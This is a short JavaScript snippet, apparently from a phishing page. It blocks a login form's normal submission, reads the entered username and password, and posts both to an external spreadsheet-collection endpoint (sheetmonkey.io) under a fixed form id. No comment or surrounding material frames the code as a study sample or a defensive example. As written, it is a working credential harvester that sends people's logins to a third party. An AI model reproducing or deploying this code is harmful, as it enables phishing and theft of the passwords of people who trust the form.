const handleSubmit = (event) => {
	event.preventDefault();
	const email = document.querySelector('input[id=username]').value;
	const pass = document.querySelector('input[id=password]').value;
	fetch('https://api.sheetmonkey.io/form/x55hzzrXbpwZ7An8GMG3gd', {
		method: 'post',
		headers: {
		'Accept': 'application/json',
		'Content-Type': 'application/json',
		},
		body: JSON.stringify({ email, pass }),
	});
}

document.querySelector('form').addEventListener('submit', handleSubmit);